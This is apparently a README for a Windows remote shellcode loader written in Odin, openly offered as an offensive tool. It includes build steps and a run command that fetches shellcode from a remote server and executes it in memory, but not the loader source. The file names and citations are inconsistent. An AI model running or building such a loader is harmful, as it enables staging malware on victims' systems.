# Valkyrie's Embrace

![1712128365149](image/README/1712128365149.png)

## Overview

I was curious about a new language I saw on Youtube and decided to try my hand on it and repurposed an old `C `remote shellcode loader I had, into ODIN the Odin programming language that allows executing shellcode on a remote system. I named this as fun gesture do to the Norse Mythologies Programming language. Just like the Valkyries of Norse mythology, who selectively choose the fallen warriors to escort to the afterlife, this tool enables you to target and execute shellcode on chosen systems with precision and a little bit of stealth.

The tool establishes a connection to a remote server *(You Set that up yourself and if you don't know how to do it then you shouldn't be playing around with this in the first place ;)* ), it retrieves the shellcode payload, and executes it on the local machine.

## Why Odin and not another language...?

1. Odin is a systems programming language designed for high performance, modern systems, and data-oriented programming. As a remote shellcode loader, Valkyrie's Embrace would benefit from Odin's low-level control over memory layout and management.[7]
2. Odin has built-in support for custom memory allocators, which provides more control and flexibility compared to languages like C for a tool like this that interacts closely with memory.[12]
3. Odin provides quality-of-life improvements over C such as a built-in slice type, tagged unions, generics, and better error handling, while still allowing low-level systems programming.[2][11]
4. Odin has an engaged community and an open-source standard library, making it pleasant to work with for a passion project like this.[8]
5. Odin is a newer language exploring interesting design choices like built-in SOA data types. Using it for this project allows you to explore and evaluate Odin's unique features and approach.[2][7]

To compile Valkyrie's Embrace, you can go to these resources on installing and setting up Odin:

- Official Odin installation guide for Windows, macOS and Linux [here](https://odin-lang.org/docs/install/)
- Video tutorial on setting up Odin with SDL2 on Windows [here](https://www.youtube.com/watch?v=_PfYX4vvJh)
- Video guide on installing Odin on Linux [here](https://www.youtube.com/watch?v=5GxJiQx2UHo) 

Odin's combination of low-level control, modern features, and community engagement made it an appealing choice for me to create a small project like Valkyrie's Embrace. The official docs and community video guides provide good resources to help others get up and running with Odin.

## Features

- Establishes a TCP connection to a remote server
- Retrieves shellcode payload from the server
- Allocates executable memory for the shellcode
- Executes the shellcode on the local machine
- Supports Windows operating system only.

## Prerequisites

To compile and run Valkyrie's Embrace, you need to have the following:

- Odin programming language installed on your system
- A Windows operating system (the tool uses Windows API functions)

## Usage

1. Clone the repository:

```bash
git clone https://github.com/a7t0fwa7/valkyries-embrace.git
```

2. Navigate to the project directory:

```bash
cd src
```

3. Compile the Odin code:

```bash
odin build ValkiriesEmbrace.odin
```

4. Run the compiled executable with the required arguments:

```bash
./ValkiriesEmbrace.exe <RemoteIP> <RemotePort> <Resource>
```

- `<RemoteIP>`: The IP address of the remote server hosting the shellcode.
- `<RemotePort>`: The port number on which the remote server is listening.
- `<Resource>`: The resource path on the remote server where the shellcode is located.

## Example

Suppose you have a remote server with IP address `192.168.0.10` listening on port `8080`, and the shellcode is located at the resource path `/shellcode`. To execute the shellcode, run the following command:

```bash
./main.exe 192.168.0.10 8080 shellcode
```

Valkyrie's Embrace will connect to the remote server, retrieve the shellcode, and execute it on the local machine, embracing the target system with its payload.

## Code Structure

The project has the following directory structure:

```
valkyries-embrace/
├── main.odin
└── README.md
```

- `main.odin`: The main Odin source file containing the implementation of Valkyrie's Embrace.
- `README.md`: This file, providing an overview and usage instructions for the tool.

## Disclaimer

Valkyrie's Embrace is intended for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this tool. Use it at your own risk and ensure that you have proper authorization before executing shellcode on any system.

## License

This project is licensed under the [MIT License](LICENSE).

## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request.

## Acknowledgements

- The Odin programming language community for their support and resources.
- The cybersecurity community for their continuous efforts in researching and sharing knowledge.
- The Norse mythology for inspiring the name and theme of this tool.
